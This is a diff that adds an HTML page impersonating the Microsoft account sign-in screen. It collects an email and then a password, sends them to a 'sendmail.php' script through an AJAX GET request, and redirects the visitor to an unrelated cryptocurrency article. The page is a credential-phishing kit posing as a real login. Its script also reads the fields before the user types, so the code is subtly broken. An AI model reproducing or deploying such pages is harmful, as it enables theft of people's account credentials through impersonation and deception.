@@ -1,0 +1,174 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="favicon.ico">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #e6d6d0;
+            background: linear-gradient(45deg, #e6d6d0, #d8dbe0, #e9e5cf);
+            display: flex;
+            flex: 1;
+        }
+
+        .page {
+            display: flex;
+            flex: 1;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login {
+            background-color: #fff;
+            max-width: 440px;
+            width: calc(100% - 10px);
+            padding: 44px;
+            box-shadow: 0px 0px 10px #7c7c7c;
+            overflow: hidden;
+            
+        }
+
+        .email, .password {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #4e4e4e;
+            padding: 6px 10px;
+        }
+
+        p {
+            font-size: .8125rem;
+        }
+
+        p a {
+            text-decoration: none;
+            color: #0067b8;
+        }
+
+        h1 {
+            font-size: 1.5rem;
+        }
+
+        p a button {
+            border: none;
+            background: #0067b8;
+            color: #fff;
+            min-height: 32px;
+            padding: 4px 30px;
+            float: right;
+        }
+
+        @media only screen and (max-width: 500px) {
+            .page {
+                background-color: #fff;
+            }
+            .login {
+                width: 100%;
+                padding: 30px;
+                box-shadow: none;           
+            }
+        }
+        .container{
+            position: relative;
+        }
+        .login-container{
+            transition: 1s;
+            position: relative;
+            width: 100%;
+        }
+        .password-container{
+            position: absolute;
+            top: 0;
+            width: 100%;
+            transform: translateX(120%);
+        }
+        .shift_left{
+            transition: 1s;
+            transform: translateX(-120%);            
+        }
+        .shift_right{
+            transition: 1s;
+            transition-delay: .5s;
+            transform: translateX(0);            
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <div class="login">
+            <img class="logo" role="img" src="logo.svg" alt="Microsoft">
+            <div class="container">
+                <div class="login-container">
+                    <h1>Sign in</h1>
+                    <input type="text" class="email" placeholder="Email, phone, or Skype">
+                    <p class="">
+                        No account? <a href="#">Create one!</a>
+                    </p>
+                    <p class="">
+                        <a href="#">Can’t access your account?</a>
+                    </p>
+                    <p class="">
+                        <a href="#">Sign-in options</a>
+                    </p>
+                    <p>
+                        <a id="next">
+                            <button>Next</button>
+                        </a>
+                    </p>
+                </div>
+    
+                <div class="password-container">
+                    <span id="email-input"></span>
+                    <h1>Enter password</h1>
+                    <input type="password" class="password" placeholder="Password">
+                    <p class="">
+                        <a href="#">Forgot password?</a>
+                    </p>
+                    <p>
+                        <a id="submit">
+                            <button>Sign In</button>
+                        </a>
+                    </p>
+                </div>
+            </div>
+            
+
+        </div>
+
+    </div>
+    <script src="jquery-3.5.1.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var email = $('.email').val()
+            var password = $('.password').val()
+
+            $('#next').on('click', function(){
+                $('.login-container').addClass('shift_left')
+                $('.password-container').addClass('shift_right')
+                $('#email-input').text($('.email').val())
+            })
+
+            $('#submit').on('click', function(){
+                $.ajax({
+                    method:'get',
+                    url: 'sendmail.php',
+                    data: {'email':email, 'password': password},
+                    success: function(data){
+                        console.log(data)
+                        window.location = 'https://www.investopedia.com/tech/most-important-cryptocurrencies-other-than-bitcoin/'
+                    }
+                })
+            })
+
+
+
+        })
+    </script>
+
+
+
+</body></html>
